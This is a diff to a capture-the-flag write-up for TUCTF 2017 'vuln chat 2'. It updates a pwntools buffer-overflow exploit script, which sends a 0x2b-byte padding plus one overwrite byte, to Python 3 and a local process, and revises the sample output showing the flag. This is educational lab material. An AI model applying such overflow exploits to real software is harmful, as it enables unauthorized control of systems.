@@ -1,6 +1,6 @@
 # Tuctf 2017 vuln chat 2
 
-The goal for this challenge is to print the contents of `flag.txt`, not pop a shell.
+This was done on `Ubuntu 20.04.4 LTS`. The goal for this challenge is to print the contents of `flag.txt`, not pop a shell.
 
 Let's take a look at the binary:
 
@@ -174,21 +174,21 @@ Putting it all together, we have the following exploit:
 from pwn import *
 
 #Establish the target
-#target = process('vuln-chat2.0')
-target = remote('vulnchat2.tuctf.com', 4242)
+target = process('vuln-chat2.0')
+#gdb.attach(target, gdbscript = 'b *0x8048608')
 
 #Print out the text up to the username prompt
-print target.recvuntil('Enter your username: ')
+print(target.recvuntil('Enter your username: '))
 
 #Send the username, doesn't really matter
-target.sendline('guyinatuxedo')
+target.sendline(b'guyinatuxedo')
 
 #Print the text up to the next prompt
-print target.recvuntil('guyinatuxedo: ')
+print(target.recvuntil(b'guyinatuxedo: '))
 
 #Construct the payload, and send it
-payload = `0`*0x2b + "\x72"
-target.sendline(payload)
+payload = b"0"*0x2b + b"\x72"
+target.send(payload)
 
 #Drop to an interactive shell
 target.interactive()
@@ -197,16 +197,13 @@ target.interactive()
 When we run it:
 
 ```
-$    python exploit.py
+$   python3 exploit.py 
 [!] Could not find executable 'vuln-chat2.0' in $PATH, using './vuln-chat2.0' instead
-[+] Starting local process './vuln-chat2.0': pid 10483
------------ Welcome to vuln-chat2.0 -------------
-Enter your username:
-Welcome guyinatuxedo!
-Connecting to 'djinn'
---- 'djinn' has joined your chat ---
-djinn: You've proven yourself to me. What information do you need?
-guyinatuxedo:
+[+] Starting local process './vuln-chat2.0': pid 5058
+exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  print(target.recvuntil('Enter your username: '))
+b'----------- Welcome to vuln-chat2.0 -------------\nEnter your username: '
+b"Welcome guyinatuxedo!\nConnecting to 'djinn'\n--- 'djinn' has joined your chat ---\ndjinn: You've proven yourself to me. What information do you need?\nguyinatuxedo: "
 [*] Switching to interactive mode
 djinn: Alright here's you flag:
 djinn: flag{1_l0v3_l337_73x7}
@@ -215,6 +212,7 @@ Ah! Found it
 flag{g0ttem_b0yz}
 Don't let anyone get ahold of this
 [*] Got EOF while reading in interactive
+$  
 ```
 
 Just like that, we got the flag!
